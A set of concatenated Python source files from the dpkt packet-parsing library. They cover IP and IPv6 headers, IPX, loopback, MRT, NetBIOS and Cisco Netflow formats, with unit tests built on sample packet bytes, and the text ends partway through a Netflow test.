IP_PROTO_SRP		= 119		# SpectraLink Radio Proto
IP_PROTO_UTI		= 120		# UTI
IP_PROTO_SMP		= 121		# Simple Message Protocol
IP_PROTO_SM		= 122		# SM
IP_PROTO_PTP		= 123		# Performance Transparency
IP_PROTO_ISIS		= 124		# ISIS over IPv4
IP_PROTO_FIRE		= 125		# FIRE
IP_PROTO_CRTP		= 126		# Combat Radio Transport
IP_PROTO_CRUDP		= 127		# Combat Radio UDP
IP_PROTO_SSCOPMCE	= 128		# SSCOPMCE
IP_PROTO_IPLT		= 129		# IPLT
IP_PROTO_SPS		= 130		# Secure Packet Shield
IP_PROTO_PIPE		= 131		# Private IP Encap in IP
IP_PROTO_SCTP		= 132		# Stream Ctrl Transmission
IP_PROTO_FC		= 133		# Fibre Channel
IP_PROTO_RSVPIGN	= 134		# RSVP-E2E-IGNORE
IP_PROTO_RAW		= 255		# Raw IP packets
IP_PROTO_RESERVED	= IP_PROTO_RAW	# Reserved
IP_PROTO_MAX		= 255

# XXX - auto-load IP dispatch table from IP_PROTO_* definitions
def __load_protos():
    g = globals()
    for k, v in g.iteritems():
        if k.startswith('IP_PROTO_'):
            name = k[9:].lower()
            try:
                mod = __import__(name, g)
            except ImportError:
                continue
            IP.set_proto(v, getattr(mod, name.upper()))

if not IP._protosw:
    __load_protos()

if __name__ == '__main__':
    import unittest
    
    class IPTestCase(unittest.TestCase):
        def test_IP(self):
            import udp
            s = 'E\x00\x00"\x00\x00\x00\x00@\x11r\xc0\x01\x02\x03\x04\x01\x02\x03\x04\x00o\x00\xde\x00\x0e\xbf5foobar'
            ip = IP(id=0, src='\x01\x02\x03\x04', dst='\x01\x02\x03\x04', p=17)
            u = udp.UDP(sport=111, dport=222)
            u.data = 'foobar'
            u.ulen += len(u.data)
            ip.data = u
            ip.len += len(u)
            self.failUnless(str(ip) == s)

            ip = IP(s)
            self.failUnless(str(ip) == s)
            self.failUnless(ip.udp.sport == 111)
            self.failUnless(ip.udp.data == 'foobar')

        def test_hl(self):
            s = 'BB\x03\x00\x00\x00\x00\x00\x00\x00\xd0\x00\xec\xbc\xa5\x00\x00\x00\x03\x80\x00\x00\xd0\x01\xf2\xac\xa5"0\x01\x00\x14\x00\x02\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            try:
                ip = IP(s)
            except dpkt.UnpackError:
                pass
            
        def test_opt(self):
            s = '\x4f\x00\x00\x50\xae\x08\x00\x00\x40\x06\x17\xfc\xc0\xa8\x0a\x26\xc0\xa8\x0a\x01\x07\x27\x08\x01\x02\x03\x04\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            ip = IP(s)
            ip.sum = 0
            self.failUnless(str(ip) == s)

    unittest.main()

########NEW FILE########
__FILENAME__ = ip6
# $Id: ip6.py 58 2010-03-06 00:06:14Z dugsong $

"""Internet Protocol, version 6."""

import dpkt

class IP6(dpkt.Packet):
    __hdr__ = (
        ('v_fc_flow', 'I', 0x60000000L),
        ('plen', 'H', 0),	# payload length (not including header)
        ('nxt', 'B', 0),	# next header protocol
        ('hlim', 'B', 0),	# hop limit
        ('src', '16s', ''),
        ('dst', '16s', '')
        )
    _protosw = {}		# XXX - shared with IP
    
    def _get_v(self):
        return self.v_fc_flow >> 28
    def _set_v(self, v):
        self.v_fc_flow = (self.v_fc_flow & ~0xf0000000L) | (v << 28)
    v = property(_get_v, _set_v)

    def _get_fc(self):
        return (self.v_fc_flow >> 20) & 0xff
    def _set_fc(self, v):
        self.v_fc_flow = (self.v_fc_flow & ~0xff00000L) | (v << 20)
    fc = property(_get_fc, _set_fc)

    def _get_flow(self):
        return self.v_fc_flow & 0xfffff
    def _set_flow(self, v):
        self.v_fc_flow = (self.v_fc_flow & ~0xfffff) | (v & 0xfffff)
    flow = property(_get_flow, _set_flow)

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.extension_hdrs = dict(((i, None) for i in ext_hdrs))
        
        buf = self.data[:self.plen]
        
        next = self.nxt
        
        while (next in ext_hdrs):
            ext = ext_hdrs_cls[next](buf)
            self.extension_hdrs[next] = ext
            buf = buf[ext.length:]
            next = ext.nxt
        
        # set the payload protocol id
        setattr(self, 'p', next)
        
        try:
            self.data = self._protosw[next](buf)
            setattr(self, self.data.__class__.__name__.lower(), self.data)
        except (KeyError, dpkt.UnpackError):
            self.data = buf
    
    def headers_str(self):
        """
        Output extension headers in order defined in RFC1883 (except dest opts)
        """
        
        header_str = ""
        
        for hdr in ext_hdrs:
            if not self.extension_hdrs[hdr] is None:
                header_str += str(self.extension_hdrs[hdr])
        return header_str
        

    def __str__(self):
        if (self.nxt == 6 or self.nxt == 17 or self.nxt == 58) and \
               not self.data.sum:
            # XXX - set TCP, UDP, and ICMPv6 checksums
            p = str(self.data)
            s = dpkt.struct.pack('>16s16sxBH', self.src, self.dst, self.nxt, len(p))
            s = dpkt.in_cksum_add(0, s)
            s = dpkt.in_cksum_add(s, p)
            try:
                self.data.sum = dpkt.in_cksum_done(s)
            except AttributeError:
                pass
        return self.pack_hdr() + self.headers_str() + str(self.data)

    def set_proto(cls, p, pktclass):
        cls._protosw[p] = pktclass
    set_proto = classmethod(set_proto)

    def get_proto(cls, p):
        return cls._protosw[p]
    get_proto = classmethod(get_proto)

# XXX - auto-load IP6 dispatch table from IP dispatch table
import ip
IP6._protosw.update(ip.IP._protosw)

class IP6ExtensionHeader(dpkt.Packet): 
    """
    An extension header is very similar to a 'sub-packet'.
    We just want to re-use all the hdr unpacking etc.
    """
    pass
    
class IP6OptsHeader(IP6ExtensionHeader):
    __hdr__ = (
        ('nxt', 'B', 0),           # next extension header protocol
        ('len', 'B', 0)            # option data length in 8 octect units (ignoring first 8 octets) so, len 0 == 64bit header
        )
        
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)       
        setattr(self, 'length', (self.len + 1) * 8)
        options = []
        
        index = 0
        
        while (index < self.length - 2):
            opt_type = ord(self.data[index])
            
            # PAD1 option
            if opt_type == 0:                    
                index += 1
                continue;
            
            opt_length = ord(self.data[index + 1])
            
            if opt_type == 1: # PADN option
                # PADN uses opt_length bytes in total
                index += opt_length + 2
                continue
            
            options.append({'type': opt_type, 'opt_length': opt_length, 'data': self.data[index + 2:index + 2 + opt_length]})
            
            # add the two chars and the option_length, to move to the next option
            index += opt_length + 2            
        
        setattr(self, 'options', options)

class IP6HopOptsHeader(IP6OptsHeader): pass
    
class IP6DstOptsHeader(IP6OptsHeader): pass    
    
class IP6RoutingHeader(IP6ExtensionHeader):
    __hdr__ = (
        ('nxt', 'B', 0),            # next extension header protocol
        ('len', 'B', 0),            # extension data length in 8 octect units (ignoring first 8 octets) (<= 46 for type 0)
        ('type', 'B', 0),           # routing type (currently, only 0 is used)
        ('segs_left', 'B', 0),      # remaining segments in route, until destination (<= 23)
        ('rsvd_sl_bits', 'I', 0),   # reserved (1 byte), strict/loose bitmap for addresses
        )

    def _get_sl_bits(self):
        return self.rsvd_sl_bits & 0xffffff
    def _set_sl_bits(self, v):
        self.rsvd_sl_bits = (self.rsvd_sl_bits & ~0xfffff) | (v & 0xfffff)
    sl_bits = property(_get_sl_bits, _set_sl_bits)
    
    def unpack(self, buf):
        hdr_size = 8
        addr_size = 16
        
        dpkt.Packet.unpack(self, buf)
        
        addresses = []
        num_addresses = self.len / 2
        buf = buf[hdr_size:hdr_size + num_addresses * addr_size]
        
        for i in range(num_addresses):
            addresses.append(buf[i * addr_size: i * addr_size + addr_size])
        
        self.data = buf
        setattr(self, 'addresses', addresses)
        setattr(self, 'length', self.len * 8 + 8)

class IP6FragmentHeader(IP6ExtensionHeader):
    __hdr__ = (
        ('nxt', 'B', 0),             # next extension header protocol
        ('resv', 'B', 0),            # reserved, set to 0
        ('frag_off_resv_m', 'H', 0), # frag offset (13 bits), reserved zero (2 bits), More frags flag
        ('id', 'I', 0)               # fragments id
        )
        
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        setattr(self, 'length', self.__hdr_len__)
        
    def _get_frag_off(self):
        return self.frag_off_resv_m >> 3
    def _set_frag_off(self, v):
        self.frag_off_resv_m = (self.frag_off_resv_m & ~0xfff8) | (v << 3)
    frag_off = property(_get_frag_off, _set_frag_off)
    
    def _get_m_flag(self):
        return self.frag_off_resv_m & 1
    def _set_m_flag(self, v):
        self.frag_off_resv_m = (self.frag_off_resv_m & ~0xfffe) | v
    m_flag = property(_get_m_flag, _set_m_flag)

class IP6AHHeader(IP6ExtensionHeader):
    __hdr__ = (
        ('nxt', 'B', 0),             # next extension header protocol
        ('len', 'B', 0),             # length of header in 4 octet units (ignoring first 2 units)
        ('resv', 'H', 0),            # reserved, 2 bytes of 0
        ('spi', 'I', 0),             # SPI security parameter index
        ('seq', 'I', 0)              # sequence no.
        )
        
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        setattr(self, 'length', (self.len + 2) * 4)
        setattr(self, 'auth_data', self.data[:(self.len - 1) * 4])
    
    
class IP6ESPHeader(IP6ExtensionHeader):
    def unpack(self, buf):
        raise NotImplementedError("ESP extension headers are not supported.")


ext_hdrs = [ip.IP_PROTO_HOPOPTS, ip.IP_PROTO_ROUTING, ip.IP_PROTO_FRAGMENT, ip.IP_PROTO_AH, ip.IP_PROTO_ESP, ip.IP_PROTO_DSTOPTS]
ext_hdrs_cls = {ip.IP_PROTO_HOPOPTS: IP6HopOptsHeader, 
                ip.IP_PROTO_ROUTING: IP6RoutingHeader,
                ip.IP_PROTO_FRAGMENT: IP6FragmentHeader, 
                ip.IP_PROTO_ESP: IP6ESPHeader, 
                ip.IP_PROTO_AH: IP6AHHeader, 
                ip.IP_PROTO_DSTOPTS: IP6DstOptsHeader}

if __name__ == '__main__':
    import unittest

    class IP6TestCase(unittest.TestCase):
        
        def test_IP6(self):
            s = '`\x00\x00\x00\x00(\x06@\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x11$\xff\xfe\x8c\x11\xde\xfe\x80\x00\x00\x00\x00\x00\x00\x02\xb0\xd0\xff\xfe\xe1\x80r\xcd\xca\x00\x16\x04\x84F\xd5\x00\x00\x00\x00\xa0\x02\xff\xff\xf8\t\x00\x00\x02\x04\x05\xa0\x01\x03\x03\x00\x01\x01\x08\n}\x185?\x00\x00\x00\x00'
            ip = IP6(s)
            #print `ip`
            ip.data.sum = 0
            s2 = str(ip)
            ip2 = IP6(s)
            #print `ip2`
            assert(s == s2)
            
        def test_IP6RoutingHeader(self):
            s = '`\x00\x00\x00\x00<+@ H\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\xca G\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xca\xfe\x06\x04\x00\x02\x00\x00\x00\x00 \x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\xca "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\xca\x00\x14\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x91\x7f\x00\x00'
            ip = IP6(s)
            s2 = str(ip)
            # 43 is Routing header id
            assert(len(ip.extension_hdrs[43].addresses) == 2)
            assert(ip.tcp)
            assert(s == s2)
            
            
        def test_IP6FragmentHeader(self):
            s = '\x06\xee\xff\xfb\x00\x00\xff\xff'
            fh = IP6FragmentHeader(s)
            s2 = str(fh)
            assert(fh.nxt == 6)
            assert(fh.id == 65535)
            assert(fh.frag_off == 8191)
            assert(fh.m_flag == 1)
            
        def test_IP6OptionsHeader(self):
            s = ';\x04\x01\x02\x00\x00\xc9\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xc2\x04\x00\x00\x00\x00\x05\x02\x00\x00\x01\x02\x00\x00'
            options = IP6OptsHeader(s).options
            assert(len(options) == 3)
            
        def test_IP6AHHeader(self):
            s = ';\x04\x00\x00\x02\x02\x02\x02\x01\x01\x01\x01\x78\x78\x78\x78\x78\x78\x78\x78'
            ah = IP6AHHeader(s)
            assert(ah.length == 24)
            assert(ah.auth_data == 'xxxxxxxx')
            assert(ah.spi == 0x2020202)
            assert(ah.seq == 0x1010101)
            
        def test_IP6ExtensionHeaders(self):
            p = '`\x00\x00\x00\x00<+@ H\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\xca G\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xca\xfe\x06\x04\x00\x02\x00\x00\x00\x00 \x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\xca "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\xca\x00\x14\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x91\x7f\x00\x00'
            ip = IP6(p)
            
            o = ';\x04\x01\x02\x00\x00\xc9\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xc2\x04\x00\x00\x00\x00\x05\x02\x00\x00\x01\x02\x00\x00'
            options = IP6HopOptsHeader(o)

            ip.extension_hdrs[0] = options
            
            fh = '\x06\xee\xff\xfb\x00\x00\xff\xff'
            ip.extension_hdrs[44] = IP6FragmentHeader(fh)
            
            ah = ';\x04\x00\x00\x02\x02\x02\x02\x01\x01\x01\x01\x78\x78\x78\x78\x78\x78\x78\x78'
            ip.extension_hdrs[51] = IP6AHHeader(ah)
            
            do = ';\x02\x01\x02\x00\x00\xc9\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            ip.extension_hdrs[60] = IP6DstOptsHeader(do)
            
            assert(len([k for k in ip.extension_hdrs if (not ip.extension_hdrs[k] is None)]) == 5)
            
    unittest.main()

########NEW FILE########
__FILENAME__ = ipx
# $Id: ipx.py 23 2006-11-08 15:45:33Z dugsong $

"""Internetwork Packet Exchange."""

import dpkt

IPX_HDR_LEN = 30

class IPX(dpkt.Packet):
    __hdr__ = (
        ('sum', 'H', 0xffff),
        ('len', 'H', IPX_HDR_LEN),
        ('tc', 'B', 0),
        ('pt', 'B', 0),
        ('dst', '12s', ''),
        ('src', '12s', '')
        )

########NEW FILE########
__FILENAME__ = loopback
# $Id: loopback.py 38 2007-03-17 03:33:16Z dugsong $

"""Platform-dependent loopback header."""

import dpkt, ethernet, ip, ip6

class Loopback(dpkt.Packet):
    __hdr__ = (('family', 'I', 0), )
    __byte_order__ = '@'
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        if self.family == 2:
            self.data = ip.IP(self.data)
        elif self.family == 0x02000000:
            self.family = 2
            self.data = ip.IP(self.data)
        elif self.family in (24, 28, 30):
            self.data = ip6.IP6(self.data)
        elif self.family > 1500:
            self.data = ethernet.Ethernet(self.data)

########NEW FILE########
__FILENAME__ = mrt
# $Id: mrt.py 29 2007-01-26 02:29:07Z jon.oberheide $

"""Multi-threaded Routing Toolkit."""

import dpkt
import bgp

# Multi-threaded Routing Toolkit
# http://www.ietf.org/internet-drafts/draft-ietf-grow-mrt-03.txt

# MRT Types
NULL			= 0
START			= 1
DIE			= 2
I_AM_DEAD		= 3
PEER_DOWN		= 4
BGP			= 5	# Deprecated by BGP4MP
RIP			= 6
IDRP			= 7
RIPNG			= 8
BGP4PLUS		= 9	# Deprecated by BGP4MP
BGP4PLUS_01		= 10	# Deprecated by BGP4MP
OSPF			= 11
TABLE_DUMP		= 12
BGP4MP			= 16
BGP4MP_ET		= 17
ISIS			= 32
ISIS_ET			= 33
OSPF_ET			= 64

# BGP4MP Subtypes
BGP4MP_STATE_CHANGE	= 0
BGP4MP_MESSAGE		= 1
BGP4MP_ENTRY		= 2
BGP4MP_SNAPSHOT		= 3
BGP4MP_MESSAGE_32BIT_AS	= 4

# Address Family Types
AFI_IPv4		= 1
AFI_IPv6		= 2

class MRTHeader(dpkt.Packet):
    __hdr__ = (
        ('ts', 'I', 0),
        ('type', 'H', 0),
        ('subtype', 'H', 0),
        ('len', 'I', 0)
        )

class TableDump(dpkt.Packet):
    __hdr__ = (
        ('view', 'H', 0),
        ('seq', 'H', 0),
        ('prefix', 'I', 0),
        ('prefix_len', 'B', 0),
        ('status', 'B', 1),
        ('originated_ts', 'I', 0),
        ('peer_ip', 'I', 0),
        ('peer_as', 'H', 0),
        ('attr_len', 'H', 0)
        )

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        plen = self.attr_len
        l = []
        while plen > 0:
            attr = bgp.BGP.Update.Attribute(self.data)
            self.data = self.data[len(attr):]
            plen -= len(attr)
            l.append(attr)
        self.attributes = l

class BGP4MPMessage(dpkt.Packet):
    __hdr__ = (
        ('src_as', 'H', 0),
        ('dst_as', 'H', 0),
        ('intf', 'H', 0),
        ('family', 'H', AFI_IPv4),
        ('src_ip', 'I', 0),
        ('dst_ip', 'I', 0)
        )

class BGP4MPMessage_32(dpkt.Packet):
    __hdr__ = (
        ('src_as', 'I', 0),
        ('dst_as', 'I', 0),
        ('intf', 'H', 0),
        ('family', 'H', AFI_IPv4),
        ('src_ip', 'I', 0),
        ('dst_ip', 'I', 0)
        )

########NEW FILE########
__FILENAME__ = netbios
# $Id: netbios.py 23 2006-11-08 15:45:33Z dugsong $

"""Network Basic Input/Output System."""

import struct
import dpkt, dns

def encode_name(name):
    """Return the NetBIOS first-level encoded name."""
    l = []
    for c in struct.pack('16s', name):
        c = ord(c)
        l.append(chr((c >> 4) + 0x41))
        l.append(chr((c & 0xf) + 0x41))
    return ''.join(l)

def decode_name(nbname):
    """Return the NetBIOS first-level decoded nbname."""
    if len(nbname) != 32:
        return nbname
    l = []
    for i in range(0, 32, 2):
        l.append(chr(((ord(nbname[i]) - 0x41) << 4) |
                     ((ord(nbname[i+1]) - 0x41) & 0xf)))
    return ''.join(l).split('\x00', 1)[0]

# RR types
NS_A		= 0x01	# IP address
NS_NS		= 0x02	# Name Server
NS_NULL		= 0x0A	# NULL
NS_NB		= 0x20	# NetBIOS general Name Service
NS_NBSTAT	= 0x21	# NetBIOS NODE STATUS

# RR classes
NS_IN		= 1

# NBSTAT name flags
NS_NAME_G	= 0x8000	# group name (as opposed to unique)
NS_NAME_DRG	= 0x1000	# deregister
NS_NAME_CNF	= 0x0800	# conflict
NS_NAME_ACT	= 0x0400	# active
NS_NAME_PRM	= 0x0200	# permanent

# NBSTAT service names
nbstat_svcs = {
    # (service, unique): list of ordered (name prefix, service name) tuples
    (0x00, 0):[ ('', 'Domain Name') ],
    (0x00, 1):[ ('IS~', 'IIS'), ('', 'Workstation Service') ],
    (0x01, 0):[ ('__MSBROWSE__', 'Master Browser') ],
    (0x01, 1):[ ('', 'Messenger Service') ],
    (0x03, 1):[ ('', 'Messenger Service') ],
    (0x06, 1):[ ('', 'RAS Server Service') ],
    (0x1B, 1):[ ('', 'Domain Master Browser') ],
    (0x1C, 0):[ ('INet~Services', 'IIS'), ('', 'Domain Controllers') ],
    (0x1D, 1):[ ('', 'Master Browser') ],
    (0x1E, 0):[ ('', 'Browser Service Elections') ],
    (0x1F, 1):[ ('', 'NetDDE Service') ],
    (0x20, 1):[ ('Forte_$ND800ZA', 'DCA IrmaLan Gateway Server Service'),
                ('', 'File Server Service') ],
    (0x21, 1):[ ('', 'RAS Client Service') ],
    (0x22, 1):[ ('', 'Microsoft Exchange Interchange(MSMail Connector)') ],
    (0x23, 1):[ ('', 'Microsoft Exchange Store') ],
    (0x24, 1):[ ('', 'Microsoft Exchange Directory') ],
    (0x2B, 1):[ ('', 'Lotus Notes Server Service') ],
    (0x2F, 0):[ ('IRISMULTICAST', 'Lotus Notes') ],
    (0x30, 1):[ ('', 'Modem Sharing Server Service') ],
    (0x31, 1):[ ('', 'Modem Sharing Client Service') ],
    (0x33, 0):[ ('IRISNAMESERVER', 'Lotus Notes') ],
    (0x43, 1):[ ('', 'SMS Clients Remote Control') ],
    (0x44, 1):[ ('', 'SMS Administrators Remote Control Tool') ],
    (0x45, 1):[ ('', 'SMS Clients Remote Chat') ],
    (0x46, 1):[ ('', 'SMS Clients Remote Transfer') ],
    (0x4C, 1):[ ('', 'DEC Pathworks TCPIP service on Windows NT') ],
    (0x52, 1):[ ('', 'DEC Pathworks TCPIP service on Windows NT') ],
    (0x87, 1):[ ('', 'Microsoft Exchange MTA') ],
    (0x6A, 1):[ ('', 'Microsoft Exchange IMC') ],
    (0xBE, 1):[ ('', 'Network Monitor Agent') ],
    (0xBF, 1):[ ('', 'Network Monitor Application') ]
    }
def node_to_service_name((name, service, flags)):
    try:
        unique = int(flags & NS_NAME_G == 0)
        for namepfx, svcname in nbstat_svcs[(service, unique)]:
            if name.startswith(namepfx):
                return svcname
    except KeyError:
        pass
    return ''
    
class NS(dns.DNS):
    """NetBIOS Name Service."""
    class Q(dns.DNS.Q):
        pass

    class RR(dns.DNS.RR):
        """NetBIOS resource record."""
        def unpack_rdata(self, buf, off):
            if self.type == NS_A:
                self.ip = self.rdata
            elif self.type == NS_NBSTAT:
                num = ord(self.rdata[0])
                off = 1
                l = []
                for i in range(num):
                    name = self.rdata[off:off+15].split(None, 1)[0].split('\x00', 1)[0]
                    service = ord(self.rdata[off+15])
                    off += 16
                    flags = struct.unpack('>H', self.rdata[off:off+2])[0]
                    off += 2
                    l.append((name, service, flags))
                self.nodenames = l
                # XXX - skip stats

    def pack_name(self, buf, name):
        return dns.DNS.pack_name(self, buf, encode_name(name))
    
    def unpack_name(self, buf, off):
        name, off = dns.DNS.unpack_name(self, buf, off)
        return decode_name(name), off

class Session(dpkt.Packet):
    """NetBIOS Session Service."""
    __hdr__ = (
        ('type', 'B', 0),
        ('flags', 'B', 0),
        ('len', 'H', 0)
        )

SSN_MESSAGE	= 0
SSN_REQUEST	= 1
SSN_POSITIVE	= 2
SSN_NEGATIVE	= 3
SSN_RETARGET	= 4
SSN_KEEPALIVE	= 5

class Datagram(dpkt.Packet):
    """NetBIOS Datagram Service."""
    __hdr__ = (
        ('type', 'B', 0),
        ('flags', 'B', 0),
        ('id', 'H', 0),
        ('src', 'I', 0),
        ('sport', 'H', 0),
        ('len', 'H', 0),
        ('off', 'H', 0)
        )

DGRAM_UNIQUE	= 0x10
DGRAM_GROUP	= 0x11
DGRAM_BROADCAST	= 0x12
DGRAM_ERROR	= 0x13
DGRAM_QUERY	= 0x14
DGRAM_POSITIVE	= 0x15
DGRAM_NEGATIVE	= 0x16

########NEW FILE########
__FILENAME__ = netflow
# $Id: netflow.py 23 2006-11-08 15:45:33Z dugsong $

"""Cisco Netflow."""

import itertools, struct
import dpkt

class NetflowBase(dpkt.Packet):
    """Base class for Cisco Netflow packets."""

    __hdr__ = (
        ('version', 'H', 1),
        ('count', 'H', 0),
        ('sys_uptime', 'I', 0),
        ('unix_sec', 'I', 0),
        ('unix_nsec', 'I', 0)
    )
 
    def __len__(self):
        return self.__hdr_len__ + (len(self.data[0]) * self.count)

    def __str__(self):
        # for now, don't try to enforce any size limits
        self.count = len(self.data)
        return self.pack_hdr() + ''.join(map(str, self.data))
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        buf = self.data
        l = []
        while buf:
            flow = self.NetflowRecord(buf)
            l.append(flow)
            buf = buf[len(flow):]
        self.data = l

    class NetflowRecordBase(dpkt.Packet):
        """Base class for netflow v1-v7 netflow records."""

        # performance optimizations
        def __len__(self):
            # don't bother with data
            return self.__hdr_len__

        def __str__(self):
            # don't bother with data
            return self.pack_hdr()

        def unpack(self, buf):
            # don't bother with data
            for k, v in itertools.izip(self.__hdr_fields__,
                struct.unpack(self.__hdr_fmt__, buf[:self.__hdr_len__])):
                setattr(self, k, v)
            self.data = ""


class Netflow1(NetflowBase):
    """Netflow Version 1."""
    
    class NetflowRecord(NetflowBase.NetflowRecordBase):
        """Netflow v1 flow record."""
        __hdr__ = (
            ('src_addr', 'I', 0),
            ('dst_addr', 'I', 0),
            ('next_hop', 'I', 0),
            ('input_iface', 'H', 0),
            ('output_iface', 'H', 0),
            ('pkts_sent', 'I', 0),
            ('bytes_sent', 'I', 0),
            ('start_time', 'I', 0),
            ('end_time', 'I', 0),
            ('src_port', 'H', 0),
            ('dst_port', 'H', 0),
            ('pad1', 'H', 0),
            ('ip_proto', 'B', 0),
            ('tos', 'B', 0),
            ('tcp_flags', 'B', 0),
            ('pad2', 'B', 0),
            ('pad3', 'H', 0),
            ('reserved', 'I', 0)
        )

# FYI, versions 2-4 don't appear to have ever seen the light of day.

class Netflow5(NetflowBase):
    """Netflow Version 5."""
    __hdr__ = NetflowBase.__hdr__ + (
        ('flow_sequence', 'I', 0),
        ('engine_type', 'B', 0),
        ('engine_id', 'B', 0),
        ('reserved', 'H', 0),
    )

    class NetflowRecord(NetflowBase.NetflowRecordBase):
        """Netflow v5 flow record."""
        __hdr__ = (
            ('src_addr', 'I', 0),
            ('dst_addr', 'I', 0),
            ('next_hop', 'I', 0),
            ('input_iface', 'H', 0),
            ('output_iface', 'H', 0),
            ('pkts_sent', 'I', 0),
            ('bytes_sent', 'I', 0),
            ('start_time', 'I', 0),
            ('end_time', 'I', 0),
            ('src_port', 'H', 0),
            ('dst_port', 'H', 0),
            ('pad1', 'B', 0),
            ('tcp_flags', 'B', 0),
            ('ip_proto', 'B', 0),
            ('tos', 'B', 0),
            ('src_as', 'H', 0),
            ('dst_as', 'H', 0),
            ('src_mask', 'B', 0),
            ('dst_mask', 'B', 0),
            ('pad2', 'H', 0),
        )

class Netflow6(NetflowBase):
    """Netflow Version 6.
    XXX - unsupported by Cisco, but may be found in the field.
    """
    __hdr__ = Netflow5.__hdr__

    class NetflowRecord(NetflowBase.NetflowRecordBase):
        """Netflow v6 flow record."""
        __hdr__ = (
            ('src_addr', 'I', 0),
            ('dst_addr', 'I', 0),
            ('next_hop', 'I', 0),
            ('input_iface', 'H', 0),
            ('output_iface', 'H', 0),
            ('pkts_sent', 'I', 0),
            ('bytes_sent', 'I', 0),
            ('start_time', 'I', 0),
            ('end_time', 'I', 0),
            ('src_port', 'H', 0),
            ('dst_port', 'H', 0),
            ('pad1', 'B', 0),
            ('tcp_flags', 'B', 0),
            ('ip_proto', 'B', 0),
            ('tos', 'B', 0),
            ('src_as', 'H', 0),
            ('dst_as', 'H', 0),
            ('src_mask', 'B', 0),
            ('dst_mask', 'B', 0),
            ('in_encaps', 'B', 0),
            ('out_encaps', 'B', 0),
            ('peer_nexthop', 'I', 0),
        )

class Netflow7(NetflowBase):
    """Netflow Version 7."""
    __hdr__ = NetflowBase.__hdr__ + (
        ('flow_sequence', 'I', 0),
        ('reserved', 'I', 0),
    )

    class NetflowRecord(NetflowBase.NetflowRecordBase):
        """Netflow v7 flow record."""
        __hdr__ = (
            ('src_addr', 'I', 0),
            ('dst_addr', 'I', 0),
            ('next_hop', 'I', 0),
            ('input_iface', 'H', 0),
            ('output_iface', 'H', 0),
            ('pkts_sent', 'I', 0),
            ('bytes_sent', 'I', 0),
            ('start_time', 'I', 0),
            ('end_time', 'I', 0),
            ('src_port', 'H', 0),
            ('dst_port', 'H', 0),
            ('flags', 'B', 0),
            ('tcp_flags', 'B', 0),
            ('ip_proto', 'B', 0),
            ('tos', 'B', 0),
            ('src_as', 'H', 0),
            ('dst_as', 'H', 0),
            ('src_mask', 'B', 0),
            ('dst_mask', 'B', 0),
            ('pad2', 'H', 0),
            ('router_sc', 'I', 0),
            )

# No support for v8 or v9 yet.

if __name__ == '__main__':
    import unittest

    class NetflowV1TestCase(unittest.TestCase):
        sample_v1 = "\x00\x01\x00\x18gza<B\x00\xfc\x1c$\x93\x08p\xac\x01 W\xc0\xa8c\xf7\n\x00\x02\x01\x00\x03\x00\n\x00\x00\x00\x01\x00\x00\x02(gz7,gz7,\\\x1b\x00P\xac\x01\x11,\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x01\x18S\xac\x18\xd9\xaa\xc0\xa82\x02\x00\x03\x00\x19\x00\x00\x00\x01\x00\x00\x05\xdcgz7|gz7|\xd8\xe3\x00P\xac\x01\x06,\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x01\x14\x18\xac\x18\x8d\xcd\xc0\xa82f\x00\x03\x00\x07\x00\x00\x00\x01\x00\x00\x05\xdcgz7\x90gz7\x90\x8a\x81\x17o\xac\x01\x066\x10\x00\x00\x00\x00\x04\x00\x03\xac\x0f'$\xac\x01\xe5\x1d\xc0\xa82\x06\x00\x04\x00\x1b\x00\x00\x00\x01\x00\x00\x02(gz:8gz:8\xa3Q\x126\xac)\x06\xfd\x18\x00\x00\x00\x00\x04\x00\x1b\xac\x01\x16E\xac#\x17\x8e\xc0\xa82\x06\x00\x03\x00\x1b\x00\x00\x00\x01\x00\x00\x02(gz:Lgz:L\xc9\xff\x00P\xac\x1f\x06\x86\x02\x00\x00\x00\x00\x03\x00\x1b\xac\r\t\xff\xac\x01\x99\x95\xc0\xa82\x06\x00\x04\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz:Xgz:X\xee9\x00\x17\xac\x01\x06\xde\x10\x00\x00\x00\x00\x04\x00\x03\xac\x0eJ\xd8\xac\x01\xae/\xc0\xa82\x06\x00\x04\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz:hgz:h\xb3n\x00\x15\xac\x01\x06\x81\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x01#8\xac\x01\xd9*\xc0\xa82\x06\x00\x03\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz:tgz:t\x00\x00\x83P\xac!\x01\xab\x10\x00\x00\x00\x00\x03\x00\x1b\xac\n`7\xac*\x93J\xc0\xa82\x06\x00\x04\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz:tgz:t\